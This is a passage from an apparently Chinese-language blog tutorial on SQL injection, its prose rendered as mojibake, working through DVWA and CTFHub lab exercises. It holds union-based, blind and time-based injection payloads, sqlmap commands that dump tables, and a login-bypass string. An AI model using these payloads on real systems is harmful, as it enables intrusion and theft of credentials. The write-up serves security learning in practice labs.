ä¸­$idå‰çš„<code>&#39;</code>ä¼˜å…ˆåŒ¹é…ï¼Œåé¢çš„SQLè¯­å¥åªè¦ç”¨unionä¸å‰é¢çš„SELECTè¯­å¥è¿æ¥ï¼Œå°±å¯ä»¥åšåˆ°è®©åå°æœåŠ¡å™¨æ‰§è¡Œèƒ½è¾¾åˆ°æ”»å‡»ç›®çš„çš„SQLè¯­å¥ã€‚</li><li>æœ€åçš„<code>#</code>ä½œç”¨æ˜¯å°†è¯­å¥ç»“å°¾çš„<code>&#39;</code>å’Œ<code>;</code>æ³¨é‡Šæ‰ï¼Œå°†<code>&#39;</code>æ³¨é‡Šæ‰æ˜¯ä¸ºäº†é˜²æ­¢è¯­æ³•é”™è¯¯ï¼Œå¹¶ä¸”å¯¹äºå•å¥SQLè¯­å¥å³ä½¿æ²¡æœ‰<code>;</code>ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œ</li></ul></blockquote><ul><li>å›æ˜¾éƒ¨åˆ†çš„ä»£ç ä¸º:</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Get values</span></span><br><span class="line">    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç”±äºä½¿ç”¨whileå¾ªç¯ï¼Œå¯ä»¥çŒœæƒ³åˆ°å¦‚æœæ‰§è¡Œçš„SQLè¯­å¥unionä¸Šåˆ«çš„SQLè¯­å¥(è”åˆæŸ¥è¯¢)ï¼Œåªè¦æŸ¥è¯¢çš„å­—æ®µæ•°å’Œç±»å‹ç›¸åŒï¼Œæ¯ä¸€è¡Œçš„æ•°æ®éƒ½å¯ä»¥è¢«å›æ˜¾å‡ºæ¥</p></blockquote><h4 id="åˆ¤æ–­åˆ—æ•°"><a href="#åˆ¤æ–­åˆ—æ•°" class="headerlink" title="åˆ¤æ–­åˆ—æ•°"></a>åˆ¤æ–­åˆ—æ•°</h4><p>SQLè¯­è¨€ä¸­<code>order by</code>å…³é”®å­—ç”¨äºç»™æŸ¥è¯¢çš„è¡¨æ·»åŠ æ’åºæ¡ä»¶å¹¶ä¸”å¤„äºSELECTè¯­å¥æœ«å°¾ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸çŸ¥é“æŸ¥è¯¢ç»“æœçš„å­—æ®µåï¼Œä½†å¯ä»¥åœ¨<code>order by</code>åç›´æ¥è·Ÿæ•°å­—1è¡¨ç¤ºæŒ‰ç¬¬ä¸€å­—æ®µæ’åºï¼Œç”¨æ­¤æ–¹å¼å‘ç°åœ¨è¾“å…¥ <code>1&#39; and order by 3#</code>æ—¶å‘ç”Ÿé”™è¯¯ï¼Œå› æ­¤å¾—çŸ¥æŸ¥è¯¢ç»“æœæ€»åˆ—æ•°ä¸º2,è¿™è¡¨ç¤ºä¹‹åunion åçš„selectè¯­å¥ä»…ä»…åªèƒ½æŸ¥è¯¢<strong>ä¸¤ä¸ªå­—æ®µ</strong><br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221721.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="è·å–åº“åã€è¡¨åã€å­—æ®µå"><a href="#è·å–åº“åã€è¡¨åã€å­—æ®µå" class="headerlink" title="è·å–åº“åã€è¡¨åã€å­—æ®µå"></a>è·å–åº“åã€è¡¨åã€å­—æ®µå</h4><ul><li>è·å–åº“å,è¦æƒ³è·å–å…³é”®ä¿¡æ¯ï¼Œå¾—çŸ¥é“åº“åã€è¡¨åã€å­—æ®µåï¼Œåˆ©ç”¨user()å’Œdatabase()å‡½æ•°åˆ†åˆ«è·å–ç”¨æˆ·åå’Œæ•°æ®åº“åç§°<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221259.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><blockquote><p>ç”±äºè¯¥æƒ…æ™¯ä¸‹unionåçš„selectè¯­å¥å¿…é¡»æœ‰ä¸¤ä¸ªå­—æ®µï¼Œè¿™é‡Œä¸»è¦è·å–æ•°æ®åº“åç§°ï¼Œuser()å¯ä»¥æ›¿æ¢æˆå…¶ä»–å‡½æ•°æˆ–è€…å¸¸é‡ç­‰ç­‰éƒ½å¯ä»¥</p><h3 id="è·å–æ‰€æœ‰åº“å"><a href="#è·å–æ‰€æœ‰åº“å" class="headerlink" title="è·å–æ‰€æœ‰åº“å"></a>è·å–æ‰€æœ‰åº“å</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(schema_name) <span class="keyword">FROM</span> information_schema.schemata</span><br></pre></td></tr></table></figure></div></blockquote><ul><li>è·å–è¡¨å,è¿™è¾¹éœ€è¦äº†è§£åˆ°<code>information_schema</code>æ˜¯mysqlè‡ªå¸¦çš„æ•°æ®åº“ï¼Œå…¶ä¸­åä¸º<code>tables</code>çš„è¡¨ä¸­çš„ä¸¤ä¸ªå­—æ®µ<code>table_name</code>å’Œ<code>table_schema</code>è®°å½•äº†DBMSä¸­çš„å­˜å‚¨çš„è¡¨åå’Œè¡¨åæ‰€åœ¨çš„æ•°æ®åº“ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†æ•°æ®åº“åç§°ä¸º<code>dvwa</code>ï¼Œå¯ä»¥åŠ å…¥WHEREè¿›è¡Œæ¡ä»¶æŸ¥è¯¢,æœ€ç»ˆåå°æœåŠ¡å™¨è¿è¡Œçš„SQLè¯­å¥ä¸º:</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> table_name, table_schema <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¾—åˆ°è¡¨åæœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«ä¸º<code>guestbook</code>å’Œ <code>users</code>ï¼Œæ ¹æ®ç»éªŒåˆ¤æ–­ç½‘ç«™æ•æ„Ÿä¿¡æ¯å­˜å‚¨åœ¨usersè¡¨ä¸­</p></blockquote><ul><li><p>è·å–å­—æ®µåï¼Œ<code>information_schema</code>ä¸­æœ‰ä¸€å¼ åä¸º<code>columns</code>çš„è¡¨ï¼Œå…¶ä¸­<code>column_name</code>å­˜å‚¨äº†å­—æ®µåï¼Œé€šè¿‡å¢åŠ æ¡ä»¶<code>table_name = &#39;users&#39;</code>ï¼ŒæˆåŠŸè·å–<code>users</code>è¡¨çš„å­—æ®µå<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221711.png"                      alt="1"                ><figcaption>1</figcaption></figure></p></li><li><p><strong>è·å–æ•æ„Ÿä¿¡æ¯</strong>: ä»å­—æ®µåå¯çœ‹å‡ºï¼Œuserå’Œpasswordå­˜å‚¨ç€é‡è¦ä¿¡æ¯ï¼Œæ·»åŠ <code>select user, password from dvwa.users</code> å³å¯å¾—åˆ°è´¦å·åŠå¯†ç ï¼Œå¯†ç ä½¿ç”¨äº†md5åŠ å¯†<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221287.png"                      alt="1"                ><figcaption>1</figcaption></figure></p></li></ul><h3 id="2-2-æ•´æ•°å‹æ³¨å…¥-CTFHubæŠ€èƒ½æ ‘"><a href="#2-2-æ•´æ•°å‹æ³¨å…¥-CTFHubæŠ€èƒ½æ ‘" class="headerlink" title="2.2 æ•´æ•°å‹æ³¨å…¥(CTFHubæŠ€èƒ½æ ‘)"></a>2.2 æ•´æ•°å‹æ³¨å…¥(CTFHubæŠ€èƒ½æ ‘)</h3><ul><li>è¾“å…¥1ï¼Œç”±ä¸‹æ–¹çº¢å­—æç¤ºè¾“å…¥çš„å†…å®¹æ²¡æœ‰è¢«<code>&#39;</code>åŒ…è£¹ï¼Œè¿™ç§ç§°ä¸ºæ•´æ•°å‹è¾“å…¥ï¼Œè¾“å…¥<code>1 and 1=2</code>æ²¡æœ‰å›æ˜¾ä¹Ÿå¯ä»¥éªŒè¯è¿™æ˜¯æ•´æ•°å‹æ³¨å…¥ï¼Œå› ä¸ºå¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œå­—ç¬¦ä¸²â€™1 and 1&#x3D;2â€™è‡ªåŠ¨è½¬æ¢æˆæ•´æ•°1ï¼Œä»æœ‰å›æ˜¾<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221732.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><blockquote><p>SQLä¸­å­—ç¬¦ä¸²è‡ªåŠ¨è½¬æ¢æˆæ•´å‹è§„å¾‹ï¼šä»å·¦è¾¹ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æ’æŸ¥èµ·ï¼Œè½¬æ¢æˆå‡ºç°çš„ç¬¬ä¸€ä¸ªéæ•°å­—å­—ç¬¦å‰çš„æ•°å­—å¯¹åº”çš„æ•´å‹ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦å°±ä¸æ˜¯æ•°å­—ï¼Œåˆ™è½¬æ¢æˆ0</p></blockquote><ul><li>ç»§ç»­ä½¿ç”¨åŒå­—ç¬¦å‹æ³¨å…¥åŒæ ·çš„æ–¹æ³•ï¼Œ<strong>åˆ¤æ–­å®Œåˆ—æ•°å</strong>åœ¨è¾“å…¥çš„IDåè·Ÿä¸Šunionè¯­å¥,å‘ç°å›æ˜¾ä»ä¸ºidä¸º1çš„ä¿¡æ¯ï¼ŒåŸå› çŒœæµ‹æ˜¯è¯¥ç½‘é¡µåªä¼šå›æ˜¾æŸ¥è¯¢ç»“æœçš„ç¬¬ä¸€è¡Œï¼Œå› æ­¤è¦å®ç°è®©å‰ä¸€ä¸ªselectè¯­å¥æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œå¯ä»¥è®©å…¶WHEREåè·Ÿçš„æ¡ä»¶å§‹ç»ˆä¸ºåŠ ï¼Œå¦‚ï¼š<code>1 and 1=2</code><br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221925.png"                      alt="1"                ><figcaption>1</figcaption></figure></li><li>å‰©ä¸‹çš„åŒå­—ç¬¦å‹æ³¨å…¥ä¸€æ ·çš„æµç¨‹ï¼šå¾—åˆ°æ•°æ®åº“åã€è¡¨åã€å­—æ®µåï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢ç»“æœåªè¿”å›ä¸€è¡Œï¼Œä¸ºäº†é˜²æ­¢æŸ¥è¯¢ç»“æœæœ‰å¤šè¡Œæ— æ³•æ˜¾ç¤ºå®Œå…¨ï¼Œä½¿ç”¨<code>group_concat(å­—æ®µå)</code>å‡½æ•°ï¼Œå°†æ‰€æœ‰è¡Œç»¼åˆä¸ºä¸€è¡Œè¾“å‡ºï¼Œæœ€ç»ˆå¾—åˆ°flag<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032222504.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><h3 id="2-3-SQLç›²æ³¨"><a href="#2-3-SQLç›²æ³¨" class="headerlink" title="2.3 SQLç›²æ³¨"></a>2.3 SQLç›²æ³¨</h3><p>ç›²æ³¨æŒ‡SQLè¯­å¥æ‰§è¡ŒæŸ¥è¯¢åï¼ŒæŸ¥è¯¢æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ä¸­</p><h4 id="å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—"><a href="#å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—" class="headerlink" title="å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—"></a>å¯èƒ½éœ€è¦ç”¨åˆ°çš„å‡½æ•°ã€å…³é”®å­—</h4><ul><li>substr(å­—ç¬¦ä¸²,ç´¢å¼•å¼€å§‹ä½,ç´¢å¼•ç»“æŸä½):ç”¨äºè·å–å­—ç¬¦ä¸²ä¸­çš„ç‰¹å®šå­—ç¬¦</li><li><code>limit å¼€å§‹è¡Œæ•°çš„ç´¢å¼•,æ˜¾ç¤ºçš„æ€»è¡Œæ•°</code>:æ”¾åœ¨selectæŸ¥è¯¢è¯­å¥æœ€å,é™åˆ¶æ˜¾ç¤ºè¡Œæ•°,ç´¢å¼•ä»0å¼€å§‹</li><li>ascii(å­—ç¬¦):å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼</li><li>ord(str)ï¼šå‡½æ•°è¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦è¾¹å­—ç¬¦çš„ASCIIç å€¼</li></ul><h4 id="å¸ƒå°”ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹"><a href="#å¸ƒå°”ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹" class="headerlink" title="å¸ƒå°”ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)"></a>å¸ƒå°”ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)</h4><p>é€‚ç”¨äºå›æ˜¾åªæœ‰ä¸¤ç§çš„æƒ…å†µï¼Œå¦‚<code>User ID exists in the database.</code>å’Œ<code>User ID is MISSING from the database.</code>åˆ†åˆ«å¯¹åº”äº†è¾“å…¥è¯­å¥è¿”å›çš„å¸ƒå°”å€¼ã€‚</p><ul><li>å¦‚æœé‡‡ç”¨æ‰‹åŠ¨æ³¨å…¥ï¼Œä¸€èˆ¬è¦ç»“åˆäºŒåˆ†æŸ¥æ‰¾ã€ç©·ä¸¾æ³•ç­‰æ–¹æ³•æ¥é€ä¸€ç ´è§£å‡ºåº“ã€è¡¨ã€å­—æ®µçš„åç§°ã€‚(ä»¥ä¸‹ä¸ºçŒœè§£æ•°æ®åº“åç§°çš„ä¾‹å­)</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">count</span><span class="params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="comment">//çŒœè§£æ•°æ®åº“ä¸ªæ•°</span></span><br><span class="line">1&#x27; and <span class="title function_">length</span><span class="params">(database())</span>=n # <span class="comment">//nä¸ºå¤§äº1çš„æ•´æ•°,çŒœè§£æ•°æ®åº“åç§°é•¿åº¦</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">ascii</span><span class="params">(substr((select schema_name from information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))</span>)&gt;n # <span class="comment">//nä¸ºå¤§å°å†™å­—æ¯å¯¹åº”çš„ASCIIç å€¼ï¼Œæ­¤å¤„éœ€å€Ÿç”¨äºŒåˆ†æŸ¥æ‰¾æ¥é€ä¸€ç¡®å®šæ¯ä¸€ä¸ªæ•°æ®åº“çš„åç§°</span></span><br></pre></td></tr></table></figure></div><ul><li>å¯ä»¥å€Ÿç”¨sqlmapå·¥å…·æ¥è‡ªåŠ¨åŒ–å®ç°è¿™ç§æœºå™¨çš„è¿‡ç¨‹ï¼Œmacä¸‹å…·ä½“æŒ‡ä»¤ä¸º</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;ç½‘å€&quot;</span> --batch --dbs  <span class="comment">//è·å–æ•°æ®åº“åç§°,batchæ„æ€ä¸ºä¸è¯¢é—®è¾“å…¥é»˜è®¤è¾“å…¥Y</span></span><br><span class="line">sqlmap -u <span class="string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å --tables <span class="comment">//è·å–è¡¨å</span></span><br><span class="line">sqlmap -u <span class="string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å -T è¡¨å --columns <span class="comment">//è·å–å­—æ®µå</span></span><br><span class="line">sqlmap -u <span class="string">&quot;ç½‘å€&quot;</span> --batch -D æ•°æ®åº“å -T è¡¨å -C å­—æ®µå --dump <span class="comment">//è·å–å­—æ®µå†…å­˜å‚¨ä¿¡æ¯</span></span><br></pre></td></tr></table></figure></div><p>æœ€ç»ˆå¾—åˆ°flag<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032222451.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="æ—¶é—´ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹"><a href="#æ—¶é—´ç›²æ³¨-å­—ç¬¦å‹ä¸ºä¾‹" class="headerlink" title="æ—¶é—´ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)"></a>æ—¶é—´ç›²æ³¨(å­—ç¬¦å‹ä¸ºä¾‹)</h4><p>ä»…è¦æ±‚æœ‰å›æ˜¾ï¼Œä¸»è¦åŸç†æ˜¯åˆ©ç”¨SQLä¸­ifå‡½æ•°åŠsleepå‡½æ•°å†åŠ ä¸Šå…¶ä»–ç”¨äºæ‹†è§£å­—ç¬¦ä¸²ã€è½¬æ¢å­—ç¬¦ä¸ºASCIIç å€¼çš„å‡½æ•°ï¼Œsleepå‡½æ•°ä½œä¸ºifå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ŒçŒœè§£åç§°çš„å‡½æ•°ä½œä¸ºifçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥ä»»æ„èµ‹å€¼ï¼Œä½†ä¸èƒ½ä¸sleepå‡½æ•°ç›¸åŒï¼Œå› æ­¤è‹¥çŒœè§£å‡½æ•°è¿”å›æ­£ç¡®ï¼Œåˆ™æ‰§è¡Œsleepå‡½æ•°ï¼Œæ•ˆæœä¸ºç½‘é¡µå»¶è¿Ÿäº†è®¾å®šçš„æè¿°æ‰æ˜¾ç¤ºã€‚</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> and <span class="title function_">if</span> <span class="params">((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)</span> # <span class="comment">//åˆ¤æ–­æ•°æ®åº“åç§°ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º&#x27;d&#x27;ï¼Œç»“æœæ˜¾ç¤ºæ˜æ˜¾å»¶è¿Ÿ</span></span><br></pre></td></tr></table></figure></div><h2 id="ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹"></a>ä¸‰ã€åˆ¤æ–­æ³¨å…¥ç‚¹</h2><h3 id="3-1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´"><a href="#3-1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´" class="headerlink" title="3.1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´"></a>3.1åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´</h3><p>è¾“å…¥<code>1&#39;</code>å¦‚æœæŠ¥é”™ï¼Œåˆ™å­˜åœ¨æ³¨å…¥æ¼æ´ï¼ŒæŠ¥é”™åŸå› æ˜¯å•å¼•å·æ•°é‡ä¸åŒ¹é…ï¼Œå¦‚æœæ²¡æŠ¥é”™ï¼Œè¯´æ˜å¯èƒ½è¯¥ç½‘é¡µè¿‡æ»¤äº†å•å¼•å·</p><h3 id="3-2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹"><a href="#3-2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹" class="headerlink" title="3.2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹"></a>3.2åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´æ•°å‹</h3><ul><li>è¾“å…¥<code>1 and 1=2</code>å’Œ<code>1&#39;#</code>å’Œ<code>1&#39; and &#39;1&#39;=&#39;1</code>è‹¥éƒ½å›æ˜¾idä¸º1çš„ä¿¡æ¯,åˆ™ä¸ºå­—ç¬¦å‹</li><li>è¾“å…¥<code>1 and 1=2</code>æ²¡æœ‰å›æ˜¾ï¼Œä¸”è¾“å…¥<code>1 and 1=1</code>æœ‰å›æ˜¾ï¼Œåˆ™ä¸ºæ•°å­—å‹,åŸå› <code>1 and 1=2</code>æ’ä¸ºå‡ï¼Œè¿‡æ»¤æ‰æ‰€æœ‰çš„è¡Œ</li></ul><h3 id="3-3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨"><a href="#3-3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨" class="headerlink" title="3.3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨"></a>3.3åˆ¤æ–­èƒ½å¦æ—¶é—´ç›²æ³¨</h3><table><thead><tr><th align="left">MySQL</th><th align="left">benchmark(100000000,md(5))sleep(3)</th></tr></thead><tbody><tr><td align="left">PostgreSQL</td><td align="left">PG_sleep(5)Generate_series(1,1000000)</td></tr><tr><td align="left">SQLServer</td><td align="left">waitfor delay â€˜0:0:5â€™</td></tr></tbody></table><h3 id="3-4åˆ¤æ–­æ•°æ®åº“ç±»å‹"><a href="#3-4åˆ¤æ–­æ•°æ®åº“ç±»å‹" class="headerlink" title="3.4åˆ¤æ–­æ•°æ®åº“ç±»å‹"></a>3.4åˆ¤æ–­æ•°æ®åº“ç±»å‹</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Mysqlæ•°æ®åº“<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> information_schema.tables) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ accessæ•°æ®åº“<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯ Sqlserveræ•°æ®åº“<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> sysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­æ˜¯å¦æ˜¯Oracleæ•°æ®åº“<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure></div><h2 id="å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†"><a href="#å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†"></a>å››ã€å¸¸ç”¨å‡½æ•°ã€åŸºç¡€çŸ¥è¯†</h2><h3 id="ç³»ç»Ÿå‡½æ•°"><a href="#ç³»ç»Ÿå‡½æ•°" class="headerlink" title="ç³»ç»Ÿå‡½æ•°"></a>ç³»ç»Ÿå‡½æ•°</h3><ul><li>system_user()â€”â€”ç³»ç»Ÿç”¨æˆ·å </li><li>user()â€”â€”ç”¨æˆ·å </li><li>current_user()â€”â€”å½“å‰ç”¨æˆ·å </li><li>session_user()â€”â€”é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å </li><li>database()â€”â€”æ•°æ®åº“å </li><li>version()â€”â€”æ•°æ®åº“ç‰ˆæœ¬ </li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„ </li><li>@@basedirâ€”â€”æ•°æ®åº“å®‰è£…è·¯å¾„ </li><li>@@version_conpile_osâ€”â€”æ“ä½œç³»ç»Ÿ</li></ul><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><ul><li>concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸² </li><li>concat_ws(separator,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸² </li><li>group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚</li></ul><h3 id="ä¸¤ç§æ³¨é‡Š"><a href="#ä¸¤ç§æ³¨é‡Š" class="headerlink" title="ä¸¤ç§æ³¨é‡Š"></a>ä¸¤ç§æ³¨é‡Š</h3><ul><li>â€“+</li><li><code>#</code>(urlç¼–ç %23)</li></ul><h3 id="sqlä¸­çš„é€»è¾‘è¿ç®—"><a href="#sqlä¸­çš„é€»è¾‘è¿ç®—" class="headerlink" title="sqlä¸­çš„é€»è¾‘è¿ç®—"></a>sqlä¸­çš„é€»è¾‘è¿ç®—</h3><p>ä¸‡èƒ½å¯†ç æ„é€ </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>â€™adminâ€™ andpassword<span class="operator">=</span>â€™â€™<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div><blockquote><p>åœ¨sqlä¸­andè¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äºorè¿ç®—ç¬¦ï¼Œç±»æ¯”&amp;&amp;&gt;||</p></blockquote><p>sqlä¸­ä¹Ÿèƒ½ä½¿ç”¨ä½è¿ç®—</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>&amp;çš„ä¼˜å…ˆçº§å¤§äº&#x3D;</p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight 